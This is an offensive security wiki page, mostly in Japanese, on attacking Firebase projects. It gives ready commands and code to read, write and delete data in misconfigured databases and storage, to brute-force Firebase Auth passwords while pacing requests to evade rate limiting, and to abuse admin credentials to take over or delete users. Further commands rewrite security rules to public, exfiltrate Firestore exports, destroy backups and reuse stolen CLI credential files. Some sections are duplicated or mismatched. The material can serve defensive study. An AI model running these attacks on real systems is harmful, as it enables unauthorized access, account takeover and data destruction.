# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Unauthenticated access to Firebase Realtime Database
攻撃者はこの攻撃を行うために特別な Firebase 権限を必要としません。必要なのは、Firebase Realtime Database の security rules が脆弱に設定されており、`.read: true` または `.write: true` が設定されてパブリックな読み取り/書き込みアクセスを許可していることだけです。

攻撃者はデータベースの URL を特定する必要があり、通常は次の形式に従います: `https://<project-id>.firebaseio.com/`。

この URL は、モバイルアプリのリバースエンジニアリング（Android APK のデコンパイルや iOS アプリの解析）、google-services.json（Android）や GoogleService-Info.plist（iOS）などの設定ファイルの解析、ウェブアプリのソースコードの確認、またはネットワークトラフィックを調べて `*.firebaseio.com` へのリクエストを特定することで見つけることができます。

攻撃者はデータベースの URL を特定して公開されているか確認し、データにアクセスしたり、悪意のある情報を書き込んだりします。

まず、URL に `.json` を付けて、データベースが読み取りを許可しているかを確認します。
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
レスポンスがJSONデータまたはnull（"Permission Denied"の代わりに）を含む場合、データベースは読み取りアクセスを許可している。書き込みアクセスを確認するには、攻撃者はFirebase REST APIを使用してテストの書き込みリクエストを送信してみることができる。
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
操作が成功すると、データベースは write access も許可します。

### Cloud Firestore におけるデータの露出
攻撃者はこの攻撃を実行するために特別な Firebase の権限を必要としません。必要なのは、Cloud Firestore のセキュリティルールが認証なし、または不十分な検証で read or write access を許可する脆弱な設定になっていることだけです。フルアクセスを付与する誤設定ルールの例は次のとおりです：
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
このルールは誰でも制限なくすべてのドキュメントを読み書きできるようにします。Firestore のルールは細かく設定されており、コレクションやドキュメント単位で適用されるため、特定のルールの誤りが一部のコレクションのみを露出させる場合があります。

攻撃者は Firebase Project ID を特定する必要があります。これは mobile app reverse engineering、google-services.json や GoogleService-Info.plist といった設定ファイルの解析、webアプリケーションのソースコードの調査、あるいは firestore.googleapis.com へのリクエストを特定するためのネットワークトラフィック解析などで見つけられます。

Firestore REST API は次の形式を使用します：
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
ルールが unauthenticated read access を許可している場合、攻撃者はコレクションとドキュメントを読み取ることができます。まず、特定のコレクションにアクセスを試みます:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
レスポンスが permission error（権限エラー）の代わりに JSON ドキュメントを含んでいる場合、その collection は公開されています。攻撃者は一般的な名前を試したりアプリケーションの構造を解析したりして、アクセス可能な collection を列挙できます。特定のドキュメントにアクセスするには:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
ルールが未認証の書き込みアクセスを許可しているか検証が不十分な場合、攻撃者は新しいドキュメントを作成できます:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
既存のドキュメントを変更するには PATCH を使用する必要があります:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
ドキュメントを削除してサービス拒否を引き起こすには:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Firebase Storage のファイルの露出
攻撃者はこの攻撃を実行するために特定の Firebase 権限を必要としません。必要なのは、Firebase Storage のセキュリティルールで認証なし、または不十分な検証により読み取りまたは書き込みアクセスを許可する脆弱な設定が存在することだけです。Storage rules は読み取りと書き込みの権限を独立して制御するため、ルールの誤りにより読み取りのみ、書き込みのみ、または両方が公開される可能性があります。完全なアクセスを許可する誤設定の例は次のとおりです:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
このルールは、すべてのドキュメントへの読み取り・書き込みアクセスを制限なく許可します。Firestore のルールは細かく、コレクションごとおよびドキュメントごとに適用されるため、特定のルールのミスは一部のコレクションのみを公開してしまう可能性があります。攻撃者は Firebase Project ID を特定する必要があり、これはモバイルアプリのリバースエンジニアリング、google-services.json や GoogleService-Info.plist のような設定ファイルの解析、Web アプリケーションのソースコードの調査、または firestore.googleapis.com へのリクエストを特定するためのネットワークトラフィック解析によって見つけることができます。
Firestore REST API は次の形式を使用します: `https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

ルールが unauthenticated の読み取りアクセスを許可している場合、攻撃者はコレクションやドキュメントを読み取ることができます。まず、特定のコレクションへアクセスを試みます。
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
レスポンスが権限エラーの代わりにファイルの一覧を含んでいる場合、そのファイルは公開されています。攻撃者はファイルのパスを指定することで、その内容を閲覧できます:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
ルールが認証なしの書き込みアクセスを許可しているか、検証が不十分な場合、攻撃者は悪意のあるファイルをアップロードできます。REST APIを使ってファイルをアップロードするには:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
attackerはcode shells、malware payloads、またはlarge filesをuploadしてdenial of serviceを引き起こすことができる。もしapplicationがuploaded filesをprocessまたはexecuteする場合、attackerはremote code executionを達成する可能性がある。ファイルをdeleteしてdenial of serviceを引き起こすには:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Invocation of public Firebase Cloud Functions
攻撃者はこの問題を悪用するために特別な Firebase 権限を必要としません。必要なのは、Cloud Function が認証なしで HTTP 経由で公開されていることだけです。

A function is vulnerable when it is insecurely configured:

- It uses functions.https.onRequest, which does not enforce authentication (unlike onCall functions).
- 関数のコードがユーザー認証を検証していない（例: request.auth や context.auth のチェックがない）。
- The function is publicly accessible in IAM, meaning allUsers has the roles/cloudfunctions.invoker role. This is the default behavior for HTTP functions unless the developer restricts access.

Firebase HTTP Cloud Functions are exposed through URLs such as:

- `https://<region>-<project-id>.cloudfunctions.net/<function-name>`
- `https://<project-id>.web.app/<function-name>` (when integrated with Firebase Hosting)

攻撃者はソースコード解析、ネットワークトラフィックの解析、列挙ツール、またはモバイルアプリのリバースエンジニアリングなどを通じてこれらの URL を発見できます。
If the function is publicly exposed and unauthenticated, the attacker can invoke it directly without credentials.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
関数が入力を適切に検証しない場合、攻撃者は code injection や command injection のような他の攻撃を試みる可能性があります。

### Brute-force attack against Firebase Authentication — パスワードポリシーが弱い場合
攻撃者はこの攻撃を実行するために特別な Firebase の権限を必要としません。必要なのは、Firebase API Key がモバイルやウェブアプリケーションで公開されていること、そしてパスワードポリシーがデフォルトより厳しく設定されていないことだけです。

攻撃者は Firebase API Key を特定する必要があり、これは mobile app reverse engineering、google-services.json や GoogleService-Info.plist といった設定ファイルの解析、ウェブアプリケーションのソースコードの検査（例: bootstrap.js 内）、またはネットワークトラフィックの解析で見つかります。

Firebase Authentication の REST API は次のエンドポイントを使用して、email と password で認証します:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`

Email Enumeration Protection が無効化されている場合、API のエラー応答はメールアドレスがシステムに存在するかどうかを示す可能性があります（EMAIL_NOT_FOUND vs. INVALID_PASSWORD）。これにより、攻撃者はパスワード推測を試みる前にユーザーを列挙できます。この保護が有効になっている場合、API は存在しないメールアドレスと誤ったパスワードの両方に対して同じエラーメッセージを返し、ユーザー列挙を防ぎます。

Firebase Authentication は rate limiting を強制するため、短時間にあまりにも多くの認証試行が行われるとリクエストがブロックされる可能性があることに注意してください。このため、攻撃者はレート制限を避けるために試行間に遅延を入れる必要があります。

攻撃者は API Key を特定し、既知のアカウントに対して複数のパスワードで認証試行を行います。Email Enumeration Protection が無効化されている場合、攻撃者はエラー応答を分析することで既存ユーザーを列挙できます：
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
レスポンスにEMAIL_NOT_FOUNDが含まれている場合、そのメールはシステムに存在しません。INVALID_PASSWORDが含まれている場合は、メールは存在するがパスワードが間違っており、ユーザーが登録されていることが確認できます。有効なユーザーが特定されると、攻撃者はbrute-force attemptsを行うことができます。Firebase Authenticationのレート制限を回避するために、試行間にポーズを入れることが重要です：
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
デフォルトのパスワードポリシー（最小6文字、複雑さの要件なし）では、攻撃者は6文字パスワードの全組み合わせを試すことができ、より厳しいパスワードポリシーと比べて探索空間は比較的小さくなります。

### Firebase Authentication におけるユーザー管理

攻撃を実行するには、特定の Firebase Authentication 権限が必要です。必要な権限は次のとおりです:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to retrieve user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

これらの権限は `roles/firebaseauth.admin` ロールに含まれており、Firebase Authentication リソースへの読み書きフルアクセスを付与します。これらは roles/firebase.developAdmin （すべての firebaseauth.* 権限を含む）や roles/firebase.admin （すべての Firebase サービスへのフルアクセス）などの上位ロールにも含まれます。

Firebase Admin SDK を使用するには、攻撃者はサービスアカウントの資格情報（JSONファイル）へのアクセスを必要とします。これらは、侵害されたシステム、公開されたコードリポジトリ、侵害された CI/CD システム、またはこれらの資格情報にアクセスできる開発者アカウントの侵害により見つかる可能性があります。

最初のステップは、サービスアカウントの資格情報を使用して Firebase Admin SDK を設定することです。
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
被害者のメールアドレスを使って悪意のあるユーザーを作成するため、攻撃者は Firebase Admin SDK を使ってそのメールアドレスで新しいアカウントを作成しようとします。
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
既存のユーザーを変更するには、attacker はメールアドレス、検証ステータス、またはアカウントが無効化されているかどうかといったフィールドを更新します。
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
ユーザーアカウントを削除してサービス拒否を引き起こすために、攻撃者は対象ユーザーを完全に削除するリクエストを送信します。
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
攻撃者は、UIDやメールアドレスを指定して要求することで、既存ユーザーに関する情報を取得することもできます。
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
さらに、攻撃者は検証リンクやパスワードリセットリンクを生成して、ユーザーのパスワードを変更し、そのアカウントにアクセスすることができます。
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebase Authentication におけるユーザー管理
攻撃者がこの攻撃を実行するには、特定の Firebase Authentication の権限が必要です。必要な権限は以下の通りです:

- `firebaseauth.users.create` — ユーザーを作成するため
- `firebaseauth.users.update` — 既存のユーザーを修正するため
- `firebaseauth.users.delete` — ユーザーを削除するため
- `firebaseauth.users.get` — ユーザー情報を取得するため
- `firebaseauth.users.sendEmail` — ユーザーにメールを送信するため
- `firebaseauth.users.createSession` — ユーザーセッションを作成するため

これらの権限は roles/firebaseauth.admin ロールに含まれており、Firebase Authentication リソースへの完全な読み書きアクセスを付与します。`roles/firebase.developAdmin`（すべての firebaseauth.* 権限を含む）や `roles/firebase.admin`（Firebase のすべてのサービスへのフルアクセス）など、より上位のロールにも含まれます。

Firebase Admin SDK を使用するには、攻撃者はサービスアカウントの認証情報（JSON ファイル）へのアクセスが必要です。これらは侵害されたシステム、公開されたコードリポジトリ、侵害された CI/CD 環境、またはこれらの認証情報へのアクセス権を持つ開発者アカウントの侵害などから入手される可能性があります。

最初のステップは、サービスアカウントの認証情報を使って Firebase Admin SDK を設定することです。
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
被害者のメールアドレスを使って悪意のあるユーザーを作成するために、攻撃者はそのメールで新しいユーザーアカウントを作成し、自分のパスワードとプロフィール情報を割り当てようとします。
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
既存のユーザーを変更する場合、攻撃者はメールアドレス、検証ステータス、またはアカウントが無効化されているかどうかといったフィールドを変更します。
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
ユーザーアカウントを削除することで — 実質的に denial of service を引き起こすことになり — 攻撃者はそのユーザーを永久に削除するリクエストを発行します。
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
攻撃者は、UID や email など既存ユーザの情報を、UID または email アドレスでユーザ詳細を要求して取得することもできます。
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
さらに、攻撃者は verification links or password-reset links を生成でき、ユーザーのパスワードを変更してアカウントを乗っ取ることができます。
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebase サービスにおけるセキュリティルールの変更
攻撃者は、サービスによってセキュリティルールを変更するために特定の権限が必要です。Cloud Firestore と Firebase Cloud Storage の場合、必要な権限はルールセットを作成するための `firebaserules.rulesets.create` と、リリースをデプロイするための `firebaserules.releases.create` です。これらの権限は `roles/firebaserules.admin` ロール、または `roles/firebase.developAdmin` や `roles/firebase.admin` のような上位ロールに含まれます。Firebase Realtime Database の場合、必要な権限は `firebasedatabase.instances.update` です。

攻撃者はセキュリティルールを変更するために Firebase REST API を使用する必要があります。まず、攻撃者はサービスアカウントの資格情報を使用してアクセストークンを取得する必要があります。
トークンを取得するには:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Firebase Realtime Database のルールを変更するには:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Cloud Firestore ルールを変更するには、攻撃者は ruleset を作成してからデプロイする必要があります:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
前のコマンドは projects/<project-id>/rulesets/<ruleset-id> の形式で ruleset 名を返します。新しいバージョンをデプロイするには、release を PATCH リクエストで更新する必要があります:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Firebase Cloud Storage のルールを変更するには:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
前のコマンドは projects/<project-id>/rulesets/<ruleset-id> の形式で ruleset 名を返します。新しいバージョンをデプロイするには、リリースを PATCH request を使用して更新する必要があります:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Cloud Firestore におけるデータの持ち出しと改ざん
Cloud Firestore は Cloud Datastore と同じインフラおよび権限システムを使用するため、Datastore IAM の権限は Firestore にそのまま適用されます。TTL ポリシーを操作するには、`datastore.indexes.update` 権限が必要です。データをエクスポートするには、`datastore.databases.export` 権限が必要です。データをインポートするには、datastore.databases.import 権限が必要です。大量のデータ削除を行うには、`datastore.databases.bulkDelete` 権限が必要です。

バックアップおよび復元操作には、以下の特定の権限が必要です:

- `datastore.backups.get` と `datastore.backups.list` — 利用可能なバックアップの一覧表示および詳細取得用
- `datastore.backups.delete` — バックアップを削除するため
- `datastore.backups.restoreDatabase` — バックアップからデータベースを復元するため
- `datastore.backupSchedules.create` と `datastore.backupSchedules.delete` — バックアップスケジュールを管理するため

TTL ポリシーを作成すると、削除対象となるエンティティを識別するために指定プロパティが選択されます。この TTL プロパティは Date and time 型である必要があります。attacker は既存のプロパティを選ぶことも、後で追加する予定のプロパティを指定することもできます。フィールドの値が過去の日付であれば、そのドキュメントは即時削除の対象になります。attacker は gcloud CLI を使用して TTL ポリシーを操作できます。
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
データをエクスポートして exfiltrate するために、the attacker は gcloud CLI を使用することができる。
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
悪意のあるデータをインポートするには:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
大量のデータを削除してサービス拒否を引き起こすために、攻撃者は gcloud Firestore bulk-delete tool を使ってコレクション全体を削除することができる。
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
バックアップと復元の操作では、攻撃者は database の現在の状態をキャプチャするために scheduled backups を作成したり、既存の backups を一覧表示したり、restore によって最近の変更を上書きしたり、データを恒久的に失わせるために backups を削除したり、scheduled backups を削除したりできます。日次の backup スケジュールを作成し、直ちに backup を生成するには:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
特定のバックアップから復元するには、攻撃者はそのバックアップに含まれるデータを使って新しいデータベースを作成できます。復元操作はバックアップのデータを新しいデータベースに書き込むため、既存の DATABASE_ID を使用することはできません。
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
バックアップを削除して永続的なデータ損失を引き起こすには:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Firebase CLI credentials の窃取と悪用
攻撃者はこの攻撃を実行するのに特別なFirebase権限は不要ですが、開発者のローカルシステムまたはFirebase CLI credentials ファイルへのアクセスは必要です。これらの資格情報は、次の場所にあるJSONファイルに保存されています:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

このファイルには認証トークン（refresh_token と access_token を含む）が含まれており、攻撃者は元々 firebase login を実行したユーザーとして認証できます。

攻撃者がFirebase CLI credentialsファイルにアクセスすると、そのファイルを丸ごと自分の環境にコピーできます。Firebase CLIはデフォルトの場所から自動的にその資格情報を使用するため、その後攻撃者は当該ユーザーがアクセス可能なすべてのFirebase projectsを閲覧できます。
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
